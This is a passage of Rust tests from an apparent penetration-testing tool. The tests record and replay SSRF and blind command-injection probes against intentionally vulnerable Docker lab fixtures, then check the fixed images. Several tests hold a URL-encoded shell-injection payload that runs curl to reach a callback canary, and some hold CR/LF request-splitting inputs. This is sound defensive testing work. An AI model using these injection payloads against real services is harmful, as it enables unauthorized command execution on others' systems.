            let flat = |api_image: &str| {
                Environment::builder()
                    .segment("lab")
                    .vantage("lab")
                    .service("api", api_image, "lab")
                    .service("db", "redstep/db:mvp", "lab")
                    .service("canary", "redstep/canary:mvp", "lab")
                    .build()
                    .expect("the api+db+canary environment is valid")
            };
            let vuln_env = flat("redstep/api:mvp");
            let fixed_env = flat("redstep/api:fixed");

            // Record a genuine SSRF against the vulnerable lab and take ITS witness,
            // so replaying round-trips the recorder's own output through
            // `parse_ssrf_witness`.
            let vuln_lab = bring_up(&docker, &vuln_env)
                .await
                .expect("bring up the vulnerable playground");
            let vuln_net = vantage_network(&vuln_lab, "lab").expect("the lab network");
            let vuln_scope = Scope::from_environment(&vuln_env);
            let vuln_target = vuln_scope.resolve("api:8081").expect("api is in scope");
            let vuln_canary = vuln_lab
                .containers()
                .iter()
                .find(|c| c.workload() == "canary")
                .map(|c| c.name().to_owned())
                .expect("the canary container");
            let (recorded_vuln, draft) = ssrf_exploit_from(
                &docker,
                vuln_net,
                &vuln_target,
                SSRF_CANARY_ALIAS,
                SSRF_CANARY_PORT,
                &vuln_canary,
                SSRF_TOKEN,
                Duration::from_millis(5_000),
            )
            .await
            .expect("the recording SSRF ran");
            vuln_lab
                .teardown()
                .await
                .expect("teardown after recording the witness");
            let witness = draft.reproduction;

            let on_vuln = replay_ssrf_probe(&docker, &vuln_env, &witness)
                .await
                .expect("replay against the vulnerable lab ran");
            let on_fixed = replay_ssrf_probe(&docker, &fixed_env, &witness)
                .await
                .expect("replay against the fixed lab ran");

            // The fixed lab once more: a positive control, then the #65 check's Pass.
            let fixed_lab = bring_up(&docker, &fixed_env)
                .await
                .expect("bring up the fixed playground");
            let net = fixed_lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let scope = Scope::from_environment(&fixed_env);
            let target = scope.resolve("api:8081").expect("api is in scope");
            let fixed_canary = fixed_lab
                .containers()
                .iter()
                .find(|c| c.workload() == "canary")
                .map(|c| c.name().to_owned())
                .expect("the canary container");

            // Positive control: a direct vantage->canary hit on the fixed lab is
            // recorded, proving the canary still witnesses (so "not seen" below is
            // the fix holding, not a dead canary).
            let control_url =
                format!("http://{SSRF_CANARY_ALIAS}:{SSRF_CANARY_PORT}/{SSRF_CONTROL_TOKEN}");
            let _ = run_probe_capturing(
                &docker,
                net.name(),
                wget_cmd(&control_url, 5, &[]),
                Duration::from_secs(10),
            )
            .await
            .expect("the direct canary probe ran");
            let (canary_out, _) = read_container_logs(&docker, &fixed_canary)
                .await
                .expect("read the canary logs");

            let ctx = crate::TestContext::new_in_lab(scope.clone(), docker.clone(), net);
            let recorded = ctx
                .exploit_ssrf_from_vantage(
                    &target,
                    SSRF_CANARY_ALIAS,
                    SSRF_CANARY_PORT,
                    &fixed_canary,
                )
                .await
                .expect("the fixed-lab check ran");
            let verdict = ctx.expect(&recorded).to_be(false);
            let _ = fixed_lab.teardown().await;

            assert!(
                recorded_vuln.value,
                "the recording genuinely coerces the app to reach the canary"
            );
            assert!(
                on_vuln.value,
                "the witness replays as exploited against a fresh vulnerable lab"
            );
            assert!(
                !on_fixed.value,
                "the fix closes it: the same witness is not-exploitable against the fixed lab"
            );
            assert_eq!(
                on_fixed.confidence,
                Confidence::High,
                "the fixed not-exploitable is a confident clean, not an abnormal Low"
            );
            assert!(
                canary_out.contains(SSRF_CONTROL_TOKEN),
                "positive control: the canary still records a direct hit on the fixed lab"
            );
            assert_eq!(
                verdict,
                crate::Verdict::Pass,
                "the #65 check passes against the fixed lab"
            );
        });
    }

    /// A per-probe token for the blind command-injection Docker tests (#87). Like
    /// `SSRF_TOKEN`, a fixed value the manual probes and the recorded witness reuse;
    /// the capability under test mints its own via `ssrf_token`. URL-safe and >=8
    /// chars so `validate_ssrf_token` admits it and `logs.contains` is specific.
    const BLIND_CMDI_TOKEN: &str = "redstep-blindcmdi-witness-4c2d";
    /// The positive-control token for the blind command-injection Docker tests: a
    /// DIRECT vantage->canary hit carries it, proving the canary records on the lab,
    /// so an absent witness token is "not reached", not a dead canary (RK-016).
    const BLIND_CMDI_CONTROL_TOKEN: &str = "redstep-blindcmdi-control-8a3e";

    /// Guard: the cmdi fixture image installs an HTTP client (curl), which the BLIND
    /// variant of the check (#87) depends on to make the target call back to the
    /// canary. The blind check's end-to-end behaviour is otherwise exercised only by
    /// the self-skipping Docker tests, so without this offline anchor, removing curl
    /// from the Dockerfile would silently disarm the blind check on every non-opt-in
    /// gate (RK-014, CLAUDE.md row 6). `include_str!` resolves the Dockerfile across
    /// the `exclude = ["playground"]` boundary at compile time. The assertion keys on
    /// the `apt-get install` LINE, not any mention of curl, so a comment that happens
    /// to say "curl" cannot stand in for the install. Mutation: drop the `apt-get
    /// install ... curl` line from `playground/cmdi/Dockerfile` -> this fails.
    #[test]
    fn blind_cmdi_image_carries_a_http_client() {
        let dockerfile = include_str!("../../../playground/cmdi/Dockerfile");
        let installs_curl = dockerfile
            .lines()
            .any(|l| l.contains("apt-get install") && l.contains("curl"));
        assert!(
            installs_curl,
            "the cmdi Dockerfile must install curl so the blind command-injection \
             callback can reach the canary (#87); without it the blind check silently \
             stops working off the Docker-gated tests (RK-014)"
        );
    }

    /// Guard: `blind_cmdi_coercion_path` builds the actual injection the check relies
    /// on, a URL-encoded shell-injected `curl` that fetches the canary at `/{token}`.
    /// The replay tamper-check uses this SAME builder for both the recorded and the
    /// expected path, so a mutation to the template moves both sides together and the
    /// Docker loop cannot catch it (RK-003 symmetry); only this offline literal pin
    /// does, and on every gate rather than opt-in Docker (RK-014). Pure, no Docker.
    /// Mutation: drop the `%3B` (the injecting `;`), the `curl`, or the token from the
    /// template -> the matching assertion fails.
    #[test]
    fn blind_cmdi_coercion_path_injects_a_callback_curl() {
        let path = blind_cmdi_coercion_path("canary", 8082, "tok12345");
        assert_eq!(
            path, "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345",
            "the coercion injects a URL-encoded `;curl -s http://<canary>:<port>/<token>` at /exec"
        );
        // Each piece is load-bearing for the callback: the injecting semicolon (%3B
        // ends `echo x` and starts a new command), the HTTP client, and the token.
        assert!(path.starts_with("/exec?cmd="));
        assert!(
            path.contains("%3B") && path.contains("curl"),
            "the path injects a new command (%3B) that runs curl: {path:?}"
        );
        assert!(
            path.contains("tok12345"),
            "the token is the callback target: {path:?}"
        );
    }

    /// Guard: the blind command-injection draft attributes the witness to the coerced
    /// app (`target`), not the canary (the observation point): the canary lives only
    /// in the reproduction params (#87, ADR-0023, parallel to the SSRF draft). Pure,
    /// no Docker. Mutation: set the draft's `target` to the canary alias -> the
    /// `target` assertion fails; change the stamped capability -> the capability
    /// assertion fails.
    #[test]
    fn blind_cmdi_draft_attributes_the_witness_to_the_target_not_the_canary() {
        let observation = Observation {
            value: true,
            confidence: Confidence::High,
        };
        let draft = blind_cmdi_draft(
            "lab",
            "cmdi:8083".to_owned(),
            "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345",
            "tok12345",
            "canary",
            8082,
            &observation,
            Duration::from_millis(5_000),
        );
        assert_eq!(
            draft.target, "cmdi:8083",
            "the finding is attributed to the app"
        );
        assert_eq!(draft.reproduction.target, "cmdi:8083");
        assert_eq!(
            draft.source,
            Some(NodeRef::Vantage {
                segment: "lab".to_owned()
            })
        );
        // The canary is only a reproduction param, never the target or source.
        assert_eq!(draft.reproduction.params["canary_alias"], "canary");
        assert_eq!(draft.reproduction.params["canary_port"], 8082);
        assert_eq!(draft.capability, "http_blind_cmdi_vantage");
        assert_eq!(draft.observed, serde_json::Value::Bool(true));
        assert_eq!(draft.confidence, Confidence::High);
        assert!(
            draft.summary.contains("blind command injection succeeded")
                && draft.summary.contains("tok12345"),
            "the summary names the token and the success: {:?}",
            draft.summary
        );
    }

    /// Guard: a blind command-injection witness round-trips through
    /// `parse_blind_cmdi_witness`, and a witness missing any field (or carrying a
    /// non-blind-cmdi capability) is rejected fail-closed (ADR-0022). The capability
    /// case is the one that keeps the blind replay from running an SSRF witness's
    /// coercion. Pure, no Docker. Mutation: drop a field's check -> the matching
    /// `rejected` case parses -> fails; drop the capability guard -> the SSRF witness
    /// parses -> fails.
    #[test]
    fn parse_blind_cmdi_witness_round_trips_and_rejects_an_incomplete_witness() {
        let observation = Observation {
            value: true,
            confidence: Confidence::High,
        };
        let draft = blind_cmdi_draft(
            "lab",
            "cmdi:8083".to_owned(),
            "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345",
            "tok12345",
            "canary",
            8082,
            &observation,
            Duration::from_millis(5_000),
        );
        let (segment, target, request_path, token, alias, port, timeout) =
            parse_blind_cmdi_witness(&draft.reproduction)
                .expect("a complete blind cmdi witness parses");
        assert_eq!(segment, "lab");
        assert_eq!(target, "cmdi:8083");
        assert_eq!(
            request_path,
            "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345"
        );
        assert_eq!(token, "tok12345");
        assert_eq!(alias, "canary");
        assert_eq!(port, 8082);
        assert_eq!(timeout, Duration::from_millis(5_000));

        let without = |key: &str| {
            let mut params = draft.reproduction.params.clone();
            params.as_object_mut().unwrap().remove(key);
            Reproduction {
                capability: HTTP_BLIND_CMDI_VANTAGE.to_owned(),
                target: "cmdi:8083".to_owned(),
                params,
            }
        };
        assert!(
            parse_blind_cmdi_witness(&without("token")).is_err(),
            "a witness with no token is rejected"
        );
        assert!(
            parse_blind_cmdi_witness(&without("canary_alias")).is_err(),
            "a witness with no canary_alias is rejected"
        );
        assert!(
            parse_blind_cmdi_witness(&without("canary_port")).is_err(),
            "a witness with no canary_port is rejected"
        );
        assert!(
            parse_blind_cmdi_witness(&without("vantage_segment")).is_err(),
            "a witness with no vantage_segment is rejected"
        );
        assert!(
            parse_blind_cmdi_witness(&without("request_path")).is_err(),
            "a witness with no request_path is rejected"
        );
        let not_blind_cmdi = Reproduction {
            capability: HTTP_SSRF_VANTAGE.to_owned(),
            target: "cmdi:8083".to_owned(),
            params: draft.reproduction.params.clone(),
        };
        assert!(
            parse_blind_cmdi_witness(&not_blind_cmdi).is_err(),
            "a non-blind-cmdi (here SSRF) witness is rejected"
        );
    }

    /// Guard: `blind_cmdi_path_is_safe` rejects an assembled coercion path that could
    /// re-aim the outer request's authority or split its request line (RK-015). The
    /// live vector is a `canary_alias` carrying CR/LF; the leading-`/` half backs the
    /// literal `/exec` prefix. This is a scope-relevant guard, and before it was lifted
    /// into a pure function the only thing exercising it was the Docker-gated exploit
    /// path, which default-skips, so a dropped check shipped green on the offline gate.
    /// Pure, no Docker. Mutation: make `blind_cmdi_path_is_safe` return `true`
    /// unconditionally -> the CR/LF and leading-`/` cases pass -> this fails.
    #[test]
    fn blind_cmdi_path_is_safe_rejects_a_reaiming_or_splitting_path() {
        // A normal coercion from constrained inputs is safe.
        assert!(blind_cmdi_path_is_safe(&blind_cmdi_coercion_path(
            "canary", 8082, "tok12345"
        )));
        // A canary alias carrying CR/LF would split the outer request line, even though
        // the alias reaches the path only in the query.
        assert!(!blind_cmdi_path_is_safe(&blind_cmdi_coercion_path(
            "canary\r\nHost: evil",
            8082,
            "tok12345"
        )));
        assert!(!blind_cmdi_path_is_safe(&blind_cmdi_coercion_path(
            "canary\nGET /x",
            8082,
            "tok12345"
        )));
        // A path that does not start with '/' cannot rely on the literal prefix to fix
        // the outer authority.
        assert!(!blind_cmdi_path_is_safe("exec?cmd=x"));
    }

    /// Guard: `blind_cmdi_draft` mirrors the observation in the NON-exploit and the
    /// abnormal directions, which the attribution test (only `value:true`/`High`) does
    /// not reach; those summary branches were otherwise dead on the offline gate
    /// (RK-011 in both directions). Pure, no Docker. Mutation: freeze `confidence:
    /// observation.confidence` to `Confidence::High` -> the Low case fails; replace the
    /// non-exploit or inconclusive summary text -> the matching `contains` fails.
    #[test]
    fn blind_cmdi_draft_mirrors_a_non_exploit_and_an_inconclusive_observation() {
        let clean = blind_cmdi_draft(
            "lab",
            "cmdi:8083".to_owned(),
            "/exec?cmd=x",
            "tok12345",
            "canary",
            8082,
            &Observation {
                value: false,
                confidence: Confidence::High,
            },
            Duration::from_millis(5_000),
        );
        assert_eq!(clean.observed, serde_json::Value::Bool(false));
        assert_eq!(clean.confidence, Confidence::High);
        assert!(
            clean.summary.contains("did not reach the canary"),
            "a clean non-exploit summary: {:?}",
            clean.summary
        );
        let inconclusive = blind_cmdi_draft(
            "lab",
            "cmdi:8083".to_owned(),
            "/exec?cmd=x",
            "tok12345",
            "canary",
            8082,
            &Observation {
                value: false,
                confidence: Confidence::Low,
            },
            Duration::from_millis(5_000),
        );
        assert_eq!(inconclusive.confidence, Confidence::Low);
        assert!(
            inconclusive.summary.contains("inconclusive"),
            "an abnormal-probe summary: {:?}",
            inconclusive.summary
        );
    }

    /// Guard: `replay_blind_cmdi_probe` refuses a witness whose `request_path` does not
    /// re-derive from its recorded canary and token, so a tampered witness cannot
    /// replay a different injection than the one recorded (ADR-0022). The tamper-check
    /// sits before `bring_up`, so it is reachable with no daemon (the `Docker` handle
    /// is lazy and never used here). Mutation: change the `request_path != expected_path`
    /// guard in `replay_blind_cmdi_probe` to `false` -> the tampered witness is accepted
    /// and the replay proceeds past the check -> this (expecting `Err`) fails.
    #[test]
    fn replay_blind_cmdi_probe_refuses_a_tampered_witness() {
        let draft = blind_cmdi_draft(
            "lab",
            "cmdi:8083".to_owned(),
            &blind_cmdi_coercion_path("canary", 8082, "tok12345"),
            "tok12345",
            "canary",
            8082,
            &Observation {
                value: true,
                confidence: Confidence::High,
            },
            Duration::from_millis(5_000),
        );
        let mut witness = draft.reproduction;
        // Tamper: a request_path that does not re-derive from canary+token (the token
        // in the path is DIFFERENT, not tok12345).
        witness.params.as_object_mut().unwrap().insert(
            "request_path".to_owned(),
            serde_json::json!("/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/DIFFERENT"),
        );
        let env = Environment::builder()
            .segment("lab")
            .vantage("lab")
            .service("cmdi", "redstep/cmdi:mvp", "lab")
            .service("canary", "redstep/canary:mvp", "lab")
            .build()
            .expect("the cmdi+canary environment is valid");
        let docker = Docker::connect_with_local_defaults().expect("lazy connect");
        let result = block_on(replay_blind_cmdi_probe(&docker, &env, &witness));
        assert!(
            matches!(result, Err(Error::InvalidTarget { .. })),
            "a tampered witness whose request_path does not re-derive must be refused before bring_up (got Ok: {})",
            result.is_ok()
        );
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
    /// native BLIND command-injection check verdicts `Fail` against the vulnerable
    /// cmdi fixture, with the ADR-0009 blind diagnostic, and the witness is
    /// OUT-OF-BAND (#87). The attacker injects a command that makes the cmdi target
    /// `curl` the in-lab canary; the canary records the token; the target's OWN
    /// response never carries it. A positive control (a direct vantage->canary hit)
    /// proves the canary witnesses on this lab. RK-011: the draft mirrors the
    /// observation, is tagged `http_blind_cmdi_vantage`, and is attributed to the app
    /// (`target`), not the canary. Mutation: neutralise the mvp `/exec` to an
    /// arg-vector (the fix) so the injected `curl` is an inert literal argument -> no
    /// callback -> the verdict assertion fails.
    #[test]
    fn blind_command_injection_check_flags_the_playground() {
        if !linux_docker_available() {
            eprintln!(
                "skipping blind_command_injection_check_flags_the_playground: no Linux Docker daemon"
            );
            return;
        }
        for image in ["redstep/cmdi:mvp", "redstep/canary:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping blind_command_injection_check_flags_the_playground: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service("cmdi", "redstep/cmdi:mvp", "lab")
                .service("canary", "redstep/canary:mvp", "lab")
                .build()
                .expect("the cmdi+canary environment is valid");

            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the cmdi+canary fixture (readiness-gated)");
            let vantage = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let canary_container = lab
                .containers()
                .iter()
                .find(|c| c.workload() == "canary")
                .map(|c| c.name().to_owned())
                .expect("the canary container");

            let scope = Scope::from_environment(&env);
            let target = scope.resolve("cmdi:8083").expect("cmdi is in scope");

            let ctx =
                crate::TestContext::new_in_lab(scope.clone(), docker.clone(), vantage.clone());
            let recorded = ctx
                .exploit_blind_command_injection_from_vantage(
                    &target,
                    SSRF_CANARY_ALIAS,
                    SSRF_CANARY_PORT,
                    &canary_container,
                )
                .await
                .expect("the vantage blind command-injection probe ran");
            let observed = recorded.observation.value;
            let confidence = recorded.observation.confidence;
            let verdict = ctx.expect(&recorded).to_be(false);

            // The cmdi target's OWN response never carries the token: the witness is
            // the callback at the canary, not anything in the /exec body (blind).
            let coerce =
                blind_cmdi_coercion_path(SSRF_CANARY_ALIAS, SSRF_CANARY_PORT, BLIND_CMDI_TOKEN);
            let exec_url = format!("http://{}:{}{}", target.host(), target.port(), coerce);
            let (_s, exec_body, _h) = run_probe_capturing(
                &docker,
                vantage.name(),
                wget_cmd(&exec_url, 5, &[]),
                Duration::from_secs(10),
            )
            .await
            .expect("the /exec probe ran");

            // Positive control: a direct vantage->canary hit is recorded, so the
            // canary witnesses on this lab (an absent token means not reached, not a
            // dead canary).
            let control_url =
                format!("http://{SSRF_CANARY_ALIAS}:{SSRF_CANARY_PORT}/{BLIND_CMDI_CONTROL_TOKEN}");
            let _ = run_probe_capturing(
                &docker,
                vantage.name(),
                wget_cmd(&control_url, 5, &[]),
                Duration::from_secs(10),
            )
            .await
            .expect("the direct canary probe ran");
            let (canary_out, _canary_err) = read_container_logs(&docker, &canary_container)
                .await
                .expect("read the canary logs");

            let judgements = ctx.take_judgements();
            let drafts = ctx.take_evidence_drafts();
            let _ = lab.teardown().await;

            assert_eq!(
                verdict,
                crate::Verdict::Fail,
                "the vulnerable cmdi fixture is a security FAIL"
            );
            assert!(
                observed,
                "the injected command ran and reached the canary (out-of-band witness)"
            );
            assert!(
                !exec_body.contains(BLIND_CMDI_TOKEN),
                "the cmdi target's own response does not carry the token: the body alone would not show the blind injection: {exec_body:?}"
            );
            assert!(
                canary_out.contains(BLIND_CMDI_CONTROL_TOKEN),
                "positive control: a direct hit is recorded, so the canary witnesses on this lab"
            );
            let (judgement, _) = &judgements[0];
            assert_eq!(judgement.verdict, crate::Verdict::Fail);
            let diagnostic = judgement
                .diagnostic
                .as_ref()
                .expect("a FAIL carries a diagnostic");
            assert!(
                diagnostic.probable_cause.contains(SSRF_CANARY_ALIAS)
                    && diagnostic.probable_cause.contains("command"),
                "the domain cause names the callback host and the command: {:?}",
                diagnostic.probable_cause
            );
            assert!(
                diagnostic.remediation.contains("argument vector"),
                "the domain remediation names the arg-vector fix: {:?}",
                diagnostic.remediation
            );
            // RK-011: the draft mirrors the observation, is tagged
            // http_blind_cmdi_vantage, and is attributed to the app, not the canary.
            assert_eq!(drafts[0].capability, "http_blind_cmdi_vantage");
            assert_eq!(drafts[0].observed, serde_json::Value::Bool(observed));
            assert_eq!(drafts[0].confidence, confidence);
            assert_eq!(
                drafts[0].target, "cmdi:8083",
                "the witness is attributed to the app, not the canary"
            );
            assert_eq!(
                drafts[0].source,
                Some(NodeRef::Vantage {
                    segment: "lab".to_owned()
                })
            );
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images,
    /// including `redstep/cmdi:fixed`): the blind command-injection attack-to-defense
    /// loop closes (#87), parallel to the SSRF loop. A genuine blind injection is
    /// recorded against the vulnerable cmdi fixture and its own witness is replayed
    /// against two fresh labs: it reproduces the callback against the vulnerable image
    /// and is not-exploitable, confidently, against the arg-vector `redstep/cmdi:fixed`.
    /// TWO positive controls close RK-016 in both directions a "no callback" could be
    /// vacuous: a direct canary hit proves the canary still records (not a dead
    /// canary), and a benign `/exec` on the fixed lab still returns the echoed input
    /// (`CMDI_BENIGN_RENDERED`, not the banner) proving the fixed endpoint still RUNS
    /// the command (not a dead `/exec`). The canary-only control the SSRF loop has
    /// cannot catch the dead-endpoint case; the cmdi fixture can, so it does.
    /// Mutation: revert the fixed `/exec` to the shell-concat -> the injected `curl`
    /// runs again -> the canary records the token -> `on_fixed.value` is true -> this
    /// fails; make the fixed `/exec` return a constant for every input -> the echoed
    /// benign value is absent -> the benign-control assertion fails (the gap the
    /// second control closes).
    #[test]
    fn blind_command_injection_fix_and_replay_closes_the_loop() {
        if !linux_docker_available() {
            eprintln!(
                "skipping blind_command_injection_fix_and_replay_closes_the_loop: no Linux Docker daemon"
            );
            return;
        }
        for image in [
            "redstep/cmdi:mvp",
            "redstep/cmdi:fixed",
            "redstep/canary:mvp",
        ] {
            if !image_present(image) {
                eprintln!(
                    "skipping blind_command_injection_fix_and_replay_closes_the_loop: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let flat = |cmdi_image: &str| {
                Environment::builder()
                    .segment("lab")
                    .vantage("lab")
                    .service("cmdi", cmdi_image, "lab")
                    .service("canary", "redstep/canary:mvp", "lab")
                    .build()
                    .expect("the cmdi+canary environment is valid")
            };
            let vuln_env = flat("redstep/cmdi:mvp");
            let fixed_env = flat("redstep/cmdi:fixed");

            // Record a genuine blind injection against the vulnerable lab and take ITS
            // witness, so replaying round-trips the recorder's own output through
            // `parse_blind_cmdi_witness`.
            let vuln_lab = bring_up(&docker, &vuln_env)
                .await
                .expect("bring up the vulnerable cmdi+canary");
            let vuln_net = vantage_network(&vuln_lab, "lab").expect("the lab network");
            let vuln_scope = Scope::from_environment(&vuln_env);
            let vuln_target = vuln_scope.resolve("cmdi:8083").expect("cmdi is in scope");
            let vuln_canary = vuln_lab
                .containers()
                .iter()
                .find(|c| c.workload() == "canary")
                .map(|c| c.name().to_owned())
                .expect("the canary container");
            let (recorded_vuln, draft) = blind_cmdi_exploit_from(
                &docker,
                vuln_net,
                &vuln_target,
                SSRF_CANARY_ALIAS,
                SSRF_CANARY_PORT,
                &vuln_canary,
                BLIND_CMDI_TOKEN,
                Duration::from_millis(5_000),
            )
            .await
            .expect("the recording blind cmdi ran");
            vuln_lab
                .teardown()
                .await
                .expect("teardown after recording the witness");
            let witness = draft.reproduction;

            let on_vuln = replay_blind_cmdi_probe(&docker, &vuln_env, &witness)
                .await
                .expect("replay against the vulnerable lab ran");
            let on_fixed = replay_blind_cmdi_probe(&docker, &fixed_env, &witness)
                .await
                .expect("replay against the fixed lab ran");

            // The fixed lab once more, for the two positive controls.
            let fixed_lab = bring_up(&docker, &fixed_env)
                .await
                .expect("bring up the fixed cmdi+canary");
            let net = fixed_lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let scope = Scope::from_environment(&fixed_env);
            let target = scope.resolve("cmdi:8083").expect("cmdi is in scope");
            let fixed_canary = fixed_lab
                .containers()
                .iter()
                .find(|c| c.workload() == "canary")
                .map(|c| c.name().to_owned())
                .expect("the canary container");

            // Control 1 (canary live): a direct vantage->canary hit on the fixed lab
            // is recorded, so "not seen" below is the fix holding, not a dead canary.
            let control_url =
                format!("http://{SSRF_CANARY_ALIAS}:{SSRF_CANARY_PORT}/{BLIND_CMDI_CONTROL_TOKEN}");
            let _ = run_probe_capturing(
                &docker,
                net.name(),
                wget_cmd(&control_url, 5, &[]),
                Duration::from_secs(10),
            )
            .await
            .expect("the direct canary probe ran");
            let (canary_out, _) = read_container_logs(&docker, &fixed_canary)
                .await
                .expect("read the canary logs");

            // Control 2 (/exec live): a benign /exec on the fixed lab still RUNS echo
            // and returns the echoed input, so "not seen" is not a dead endpoint. The
            // marker is the echoed benign value, NOT the banner, because the banner is
            // prefixed to every response including an error body (RK-016).
            let benign_url = format!(
                "http://{}:{}/exec?cmd={CMDI_BENIGN}",
                target.host(),
                target.port()
            );
            let (_s, benign_body, _h) = run_probe_capturing(
                &docker,
                net.name(),
                wget_cmd(&benign_url, 5, &[]),
                Duration::from_secs(10),
            )
            .await
            .expect("the benign /exec probe ran");
            let _ = fixed_lab.teardown().await;

            assert!(
                recorded_vuln.value,
                "the recording genuinely injects a command that reaches the canary"
            );
            assert!(
                on_vuln.value,
                "the witness replays as exploited against a fresh vulnerable lab"
            );
            assert!(
                !on_fixed.value,
                "the fix closes it: the same witness is not-exploitable against the fixed lab"
            );
            assert_eq!(
                on_fixed.confidence,
                Confidence::High,
                "the fixed not-exploitable is a confident clean, not an abnormal Low"
            );
            assert!(
                canary_out.contains(BLIND_CMDI_CONTROL_TOKEN),
                "positive control 1: the canary still records a direct hit on the fixed lab"
            );
            assert!(
                benign_body.contains(CMDI_BENIGN_RENDERED),
                "positive control 2: the fixed /exec still RUNS echo (its output is returned), not a dead endpoint: {benign_body:?}"
            );
        });
    }
}
